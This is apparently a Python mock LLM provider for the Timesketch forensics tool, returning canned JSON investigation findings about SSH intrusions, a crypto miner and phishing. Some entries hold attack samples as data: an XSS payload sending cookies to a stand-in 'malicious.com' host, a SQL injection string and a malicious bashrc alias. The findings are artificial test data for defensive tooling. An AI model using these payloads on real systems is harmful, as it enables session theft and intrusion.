"""Arcadia mock LLM provider."""
import json
from typing import Optional, Any
from timesketch.lib.llms.providers import interface
from timesketch.lib.llms.providers import manager

# file should be placed in timesketch/lib/llms/providers/arcadia.py, and added as import in __init__.py

class Arcadia(interface.LLMProvider):
    """Arcadia mock LLM provider."""
    NAME = "arcadia"
    
    def generate(self, prompt: str, response_schema: Optional[dict] = None) -> Any:
        """
        Generate mock log analysis results structured by record_id.
        
        Args:
            prompt: The prompt to use for the generation (ignored).
            response_schema: An optional JSON schema to define the expected
                response format (ignored).
                
        Returns:
            A JSON string containing record_ids with log details and conclusions.
        """
        # Restructured response: organized by record_id
        mock_responses = {
            # Malware indicators - Multiple observables for the same question
            "51253627": {
                "log_name": "system.log",
                "attack_stage": "initial_access",
                "investigative_questions": [
                    "Are there indicators of known malware on the filesystem?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T04:52:06.859643+00:00",
                    "source_file": "/var/log/system.log",
                    "description": "Suspicious binary execution detected"
                },
                "observable_type": "Suspicious Binary Execution",
                "conclusions": [
                    {
                        "question": "Are there indicators of known malware on the filesystem?",
                        "conclusion": "Compromised by malware, likely a cryptocurrency miner, through unauthorized SSH access. The system shows active, unauthorized mining activity.",
                        "entities": [
                            {
                                "type": "file",
                                "value": "/usr/bin/dhpcd"
                            },
                            {
                                "type": "threat-intel",
                                "value": "unknown-source"
                            },
                            {
                                "type": "threat-intel",
                                "value": "vt-sample-high"
                            }
                        ]
                    }
                ]
            },
            "51253700": {
                "log_name": "file_scan.log",
                "attack_stage": "initial_access",
                "investigative_questions": [
                    "Are there indicators of known malware on the filesystem?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T05:10:32.125643+00:00",
                    "source_file": "/var/log/file_scan.log",
                    "description": "Malware scan detected suspicious file"
                },
                "observable_type": "Malicious File Detection",
                "conclusions": [
                    {
                        "question": "Are there indicators of known malware on the filesystem?",
                        "conclusion": "Malicious binary '/usr/bin/dhpcd' matches Yara rule 'executables_ELF'. Hash matches VirusTotal IOC for cryptocurrency miner variant.",
                        "entities": [
                            {
                                "type": "file",
                                "value": "/usr/bin/dhpcd"
                            },
                            {
                                "type": "hash",
                                "value": "5a4bc85ebb3a2263ad3fe8b8575c53e84f6c902f"
                            },
                            {
                                "type": "yara-rule",
                                "value": "executables_ELF"
                            },
                            {
                                "type": "threat-intel",
                                "value": "nirvana-tool"
                            }
                        ]
                    }
                ]
            },
            
            # SSH logons - Multiple observables
            "51253626": {
                "log_name": "auth.log",
                "attack_stage": "initial_access",
                "investigative_questions": [
                    "Were there any successful SSH logons to the system?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T04:50:12.743621+00:00",
                    "source_file": "/var/log/auth.log",
                    "description": "Successful SSH login (root)"
                },
                "observable_type": "Successful Root Login",
                "conclusions": [
                    {
                        "question": "Were there any successful SSH logons to the system?",
                        "conclusion": "Successful SSH login using password for the `root` account from suspicious IP address `85.195.192.160` tagged as `[Romania, tor, mandiant_ioc]`.",
                        "entities": [
                            {
                                "type": "username",
                                "value": "root"
                            },
                            {
                                "type": "ip",
                                "value": "85.195.192.160"
                            },
                            {
                                "type": "location",
                                "value": "Romania"
                            },
                            {
                                "type": "indicator",
                                "value": "tor_exit_node"
                            }
                        ]
                    }
                ]
            },
            "51253695": {
                "log_name": "auth.log",
                "attack_stage": "initial_access",
                "investigative_questions": [
                    "Were there any successful SSH logons to the system?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T05:12:32.456123+00:00",
                    "source_file": "/var/log/auth.log",
                    "description": "Successful SSH login (root)"
                },
                "observable_type": "Successful Root Login",
                "conclusions": [
                    {
                        "question": "Were there any successful SSH logons to the system?",
                        "conclusion": "Successful SSH login using password for the `root` account from suspicious IP address `43.133.102.2` tagged as `[China, VPN]`.",
                        "entities": [
                            {
                                "type": "username",
                                "value": "root"
                            },
                            {
                                "type": "ip",
                                "value": "43.133.102.2"
                            },
                            {
                                "type": "location",
                                "value": "China"
                            },
                            {
                                "type": "indicator",
                                "value": "vpn_connection"
                            }
                        ]
                    }
                ]
            },
            "51253701": {
                "log_name": "auth.log",
                "attack_stage": "initial_access",
                "investigative_questions": [
                    "Were there any successful SSH logons to the system?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T05:28:45.783432+00:00",
                    "source_file": "/var/log/auth.log",
                    "description": "Successful SSH login (root)"
                },
                "observable_type": "Successful Root Login",
                "conclusions": [
                    {
                        "question": "Were there any successful SSH logons to the system?",
                        "conclusion": "Successful SSH login using password for the `root` account from suspicious IP address `84.239.46.144` tagged as `[Russia, mandiant_ioc]`.",
                        "entities": [
                            {
                                "type": "username",
                                "value": "root"
                            },
                            {
                                "type": "ip",
                                "value": "84.239.46.144"
                            },
                            {
                                "type": "location",
                                "value": "Russia"
                            },
                            {
                                "type": "threat-intel",
                                "value": "mandiant_ioc"
                            }
                        ]
                    }
                ]
            },
            
            # Web exploitation - Multiple observables
            "51253628": {
                "log_name": "apache_access.log",
                "attack_stage": "initial_access",
                "investigative_questions": [
                    "Are there signs of web vulnerabilities exploitation?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T05:12:33.219843+00:00",
                    "source_file": "/var/log/apache2/access.log",
                    "description": "SQL injection pattern in request"
                },
                "observable_type": "SQL Injection Attempt",
                "conclusions": [
                    {
                        "question": "Are there signs of web vulnerabilities exploitation?",
                        "conclusion": "Potential SQL injection attempt detected from IP 45.67.231.190 targeting '/admin/login.php' with payload containing 'OR 1=1--'",
                        "entities": [
                            {
                                "type": "ip",
                                "value": "45.67.231.190"
                            },
                            {
                                "type": "url_path",
                                "value": "/admin/login.php"
                            },
                            {
                                "type": "payload",
                                "value": "username=' OR 1=1--"
                            }
                        ]
                    }
                ]
            },
            "51253705": {
                "log_name": "apache_access.log",
                "attack_stage": "initial_access",
                "investigative_questions": [
                    "Are there signs of web vulnerabilities exploitation?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T05:35:42.562198+00:00",
                    "source_file": "/var/log/apache2/access.log",
                    "description": "XSS attack pattern in request"
                },
                "observable_type": "XSS Attack Attempt",
                "conclusions": [
                    {
                        "question": "Are there signs of web vulnerabilities exploitation?",
                        "conclusion": "Attempted XSS attack from IP 45.67.231.190 targeting '/contact.php' with script injection payload",
                        "entities": [
                            {
                                "type": "ip",
                                "value": "45.67.231.190"
                            },
                            {
                                "type": "url_path",
                                "value": "/contact.php"
                            },
                            {
                                "type": "payload",
                                "value": "<script>document.location='http://malicious.com/steal.php?c='+document.cookie</script>"
                            }
                        ]
                    }
                ]
            },
            
            # Bashrc modifications - Multiple observables
            "51253629": {
                "log_name": "crontab",
                "attack_stage": "persistence",
                "investigative_questions": [
                    "Are there any signs of .bashrc (or other rc files) modifications?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T05:30:15.123456+00:00",
                    "source_file": "/var/spool/cron/crontabs/root",
                    "description": "Suspicious scheduled task"
                },
                "observable_type": "Malicious Crontab",
                "conclusions": [
                    {
                        "question": "Are there any signs of .bashrc (or other rc files) modifications?",
                        "conclusion": "The root user's crontab includes a command that executes /bin/dhpcd connecting to pool.supportxmr.com:80, suggesting potential unauthorized cryptocurrency mining activity.",
                        "entities": [
                            {
                                "type": "username",
                                "value": "root"
                            },
                            {
                                "type": "executable",
                                "value": "/bin/dhpcd"
                            },
                            {
                                "type": "url",
                                "value": "pool.supportxmr.com:80"
                            }
                        ]
                    }
                ]
            },
            "51253710": {
                "log_name": "file_changes.log",
                "attack_stage": "persistence",
                "investigative_questions": [
                    "Are there any signs of .bashrc (or other rc files) modifications?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T05:42:18.953215+00:00",
                    "source_file": "/var/log/file_changes.log",
                    "description": "User bashrc file modified"
                },
                "observable_type": "Modified Bashrc File",
                "conclusions": [
                    {
                        "question": "Are there any signs of .bashrc (or other rc files) modifications?",
                        "conclusion": "The user tom's .bashrc file was modified to add a suspicious alias 'ls' that executes a hidden script at './.hidden/miner.sh' whenever the ls command is used.",
                        "entities": [
                            {
                                "type": "username",
                                "value": "tom"
                            },
                            {
                                "type": "file",
                                "value": "/home/tom/.bashrc"
                            },
                            {
                                "type": "command",
                                "value": "alias ls='ls --color=auto && ./.hidden/miner.sh &'"
                            }
                        ]
                    }
                ]
            },
            "51253715": {
                "log_name": "file_changes.log",
                "attack_stage": "persistence",
                "investigative_questions": [
                    "Are there any signs of .bashrc (or other rc files) modifications?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T05:55:22.125643+00:00",
                    "source_file": "/var/log/file_changes.log",
                    "description": "User profile file modified"
                },
                "observable_type": "Clean Bashrc Scan",
                "conclusions": [
                    {
                        "question": "Are there any signs of .bashrc (or other rc files) modifications?",
                        "conclusion": "No suspicious modifications found in user mlegin's bashrc and profile files",
                        "entities": [
                            {
                                "type": "username",
                                "value": "mlegin"
                            },
                            {
                                "type": "file",
                                "value": "/home/mlegin/.bashrc"
                            },
                            {
                                "type": "file",
                                "value": "/home/mlegin/.profile"
                            }
                        ]
                    }
                ]
            },
            
            # Product/services accessed
            "51253630": {
                "log_name": "audit.log",
                "attack_stage": "discovery",
                "investigative_questions": [
                    "What product/services were accessed from the session?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T06:05:22.654321+00:00",
                    "source_file": "/var/log/audit/audit.log",
                    "description": "Cloud service access recorded"
                },
                "observable_type": "AWS Service Access",
                "conclusions": [
                    {
                        "question": "What product/services were accessed from the session?",
                        "conclusion": "User 'analyst' accessed AWS S3 buckets and RDS database instances during the session",
                        "entities": [
                            {
                                "type": "username",
                                "value": "analyst"
                            },
                            {
                                "type": "service",
                                "value": "AWS S3"
                            },
                            {
                                "type": "service",
                                "value": "AWS RDS"
                            }
                        ]
                    }
                ]
            },
            "51253720": {
                "log_name": "browser_history.log",
                "attack_stage": "discovery",
                "investigative_questions": [
                    "What product/services were accessed from the session?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T06:22:18.256421+00:00",
                    "source_file": "/var/log/browser/history.log",
                    "description": "Web service access"
                },
                "observable_type": "Google Workspace Access",
                "conclusions": [
                    {
                        "question": "What product/services were accessed from the session?",
                        "conclusion": "User accessed Google Workspace services including Gmail, Google Drive, and Google Docs",
                        "entities": [
                            {
                                "type": "username",
                                "value": "analyst"
                            },
                            {
                                "type": "service",
                                "value": "Gmail"
                            },
                            {
                                "type": "service",
                                "value": "Google Drive"
                            },
                            {
                                "type": "service",
                                "value": "Google Docs"
                            }
                        ]
                    }
                ]
            },
            
            # IP Addresses
            "51253631": {
                "log_name": "netflow.log",
                "attack_stage": "lateral_movement",
                "investigative_questions": [
                    "What IP addresses were used to access the session?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T06:45:58.987654+00:00",
                    "source_file": "/var/log/netflow/netflow.log",
                    "description": "Network connection sequence"
                },
                "observable_type": "Internal Network Movement",
                "conclusions": [
                    {
                        "question": "What IP addresses were used to access the session?",
                        "conclusion": "Multiple IP addresses used for lateral movement: 10.0.0.55 -> 192.168.1.100 -> 172.16.0.25",
                        "entities": [
                            {
                                "type": "ip",
                                "value": "10.0.0.55"
                            },
                            {
                                "type": "ip",
                                "value": "192.168.1.100"
                            },
                            {
                                "type": "ip",
                                "value": "172.16.0.25"
                            }
                        ]
                    }
                ]
            },
            "51253725": {
                "log_name": "vpn_logs.log",
                "attack_stage": "initial_access",
                "investigative_questions": [
                    "What IP addresses were used to access the session?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T07:05:12.345678+00:00",
                    "source_file": "/var/log/vpn/access.log",
                    "description": "VPN connection established"
                },
                "observable_type": "External VPN Access",
                "conclusions": [
                    {
                        "question": "What IP addresses were used to access the session?",
                        "conclusion": "User 'analyst' connected via VPN from external IP 203.45.78.92 (Australia)",
                        "entities": [
                            {
                                "type": "username",
                                "value": "analyst"
                            },
                            {
                                "type": "ip",
                                "value": "203.45.78.92"
                            },
                            {
                                "type": "location",
                                "value": "Australia"
                            }
                        ]
                    }
                ]
            },
            
            # SafeBrowsing
            "51253632": {
                "log_name": "browser_logs",
                "attack_stage": "initial_access",
                "investigative_questions": [
                    "Did SafeBrowsing block access to a page?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T07:22:16.246809+00:00",
                    "source_file": "/var/log/browser/safebrowsing.log",
                    "description": "Malicious URL access blocked"
                },
                "observable_type": "Phishing Site Blocked",
                "conclusions": [
                    {
                        "question": "Did SafeBrowsing block access to a page?",
                        "conclusion": "SafeBrowsing blocked access to phishing website 'hxxp://malicious-site.com/login'",
                        "entities": [
                            {
                                "type": "url",
                                "value": "hxxp://malicious-site.com/login"
                            },
                            {
                                "type": "threat_type",
                                "value": "phishing"
                            }
                        ]
                    }
                ]
            },
            "51253730": {
                "log_name": "browser_logs",
                "attack_stage": "initial_access",
                "investigative_questions": [
                    "Did SafeBrowsing block access to a page?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T07:38:42.128745+00:00",
                    "source_file": "/var/log/browser/safebrowsing.log",
                    "description": "Malware download blocked"
                },
                "observable_type": "Malware Download Blocked",
                "conclusions": [
                    {
                        "question": "Did SafeBrowsing block access to a page?",
                        "conclusion": "SafeBrowsing blocked download of malicious executable from 'hxxp://download.malicious-cdn.com/update.exe', categorized as trojan malware",
                        "entities": [
                            {
                                "type": "url",
                                "value": "hxxp://download.malicious-cdn.com/update.exe"
                            },
                            {
                                "type": "threat_type",
                                "value": "trojan"
                            },
                            {
                                "type": "file",
                                "value": "update.exe"
                            }
                        ]
                    }
                ]
            },
            
            # External emails
            "51253633": {
                "log_name": "email_logs",
                "attack_stage": "initial_access",
                "investigative_questions": [
                    "What emails did the actor receive from external senders?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T08:01:45.135792+00:00",
                    "source_file": "/var/log/mail/mail.log",
                    "description": "External email with attachment received"
                },
                "observable_type": "Suspicious Email",
                "conclusions": [
                    {
                        "question": "What emails did the actor receive from external senders?",
                        "conclusion": "Received suspicious email from 'support@fakecorp.com' with malicious attachment 'invoice.exe'",
                        "entities": [
                            {
                                "type": "email",
                                "value": "support@fakecorp.com"
                            },
                            {
                                "type": "attachment",
                                "value": "invoice.exe"
                            },
                            {
                                "type": "subject",
                                "value": "Your invoice is ready for payment"
                            }
                        ]
                    }
                ]
            },
            "51253735": {
                "log_name": "email_logs",
                "attack_stage": "initial_access",
                "investigative_questions": [
                    "What emails did the actor receive from external senders?"
                ],
                "log_details": {
                    "timestamp": "2023-10-02T08:15:22.481632+00:00",
                    "source_file": "/var/log/mail/mail.log",
                    "description": "Email with suspicious link received"
                },
                "observable_type": "Phishing Email",
                "conclusions": [
                    {
                        "question": "What emails did the actor receive from external senders?",
                        "conclusion": "Received phishing email from 'security@bank-secure-verify.com' with link to fake login page",
                        "entities": [
                            {
                                "type": "email",
                                "value": "security@bank-secure-verify.com"
                            },
                            {
                                "type": "url",
                                "value": "hxxps://bank-secure-login.com/verify"
                            },
                            {
                                "type": "subject",
                                "value": "Urgent: Verify your account information"
                            }
                        ]
                    }
                ]
            }
        }
        
        return json.dumps(mock_responses)


# Register the provider
manager.LLMManager.register_provider(Arcadia)
